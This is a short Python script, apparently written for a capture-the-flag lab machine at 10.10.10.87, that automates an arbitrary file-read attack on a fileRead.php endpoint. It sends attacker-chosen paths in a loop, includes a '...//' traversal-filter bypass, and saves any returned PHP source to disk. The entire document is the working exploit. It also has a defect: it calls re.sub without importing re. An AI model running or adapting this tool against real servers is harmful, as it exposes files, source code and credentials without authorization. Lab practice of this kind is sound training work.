# A simple arbitrary file reading script to automate the process.

import requests
import json
import time
  
from os import system

proxy = {
	"http": "http://127.0.0.1:8080"
}

def readArby(file):

	data = {
		"file": file
	}

	url = "http://10.10.10.87/fileRead.php"

	headers = {

		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
		"Accept": "*/*",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate, br",
		"Content-type": "application/x-www-form-urlencoded",
		"Origin": "http://10.10.10.87",
		"Referer": "http://10.10.10.87/list.html"
	}

	resp = requests.post(url, data=data, headers=headers, proxies=proxy)
	jdata = json.loads(resp.text)
	return jdata.get("file")

if __name__ == "__main__":

	while True:
		file = input("Input: ")
		response = str(readArby(file))
		
		if "False" not in response:
			if "...//" in file:
				file = re.sub(r'\.{3,}//', '', file)
			if ".php" in response:
				open(f"{file}", "w").write(response)
			print(response)
		else:
			print("Error File Not Found!\n")
			time.sleep(1)
			system('clear')